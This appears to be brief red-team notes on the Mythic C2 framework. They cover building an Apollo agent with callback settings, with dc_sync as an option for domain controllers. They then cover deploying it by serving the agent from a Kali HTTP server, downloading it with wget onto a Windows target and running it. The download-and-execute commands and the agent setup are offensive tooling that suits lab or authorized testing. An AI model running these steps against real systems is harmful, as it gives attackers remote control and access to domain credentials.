In Mythic, to create a new payload, do the following:
Go to "Create Payload"
Select you operating system and select you payload type.
e.g.:
O/S =>Windows
Payload Type => applo
Select "Next" and "Next"

Under "Select Commands", select the commands you want to include in the C2C agent and select "Next"
If it's for a domain controller, you can select "dc_sync"

"Next" when you are done with the commands.
 Under "Select C2 Profile", select you profile and click "Include Profile"
 Ensure the following is set:
 callback_host
 callback_interval
 callback_port

"Next" when you are done.

Under Build, select the filename you want to give the agent and select "CREATE PAYLOAD"

# Deploying the agent

On you Kali box, start a http server using Python:
```
python -m http.server 8080
```

On the target box (e.g. Windows), download the agent (e.g.: agent.exe):
```
cd /Windows/Temp
wget http://<kaliIP>:8080/agent.exe -outfile agent.exe
./agent.exe
```

Once the agent checked in, you can start running commands:
```
shell whoami /priv
```


 

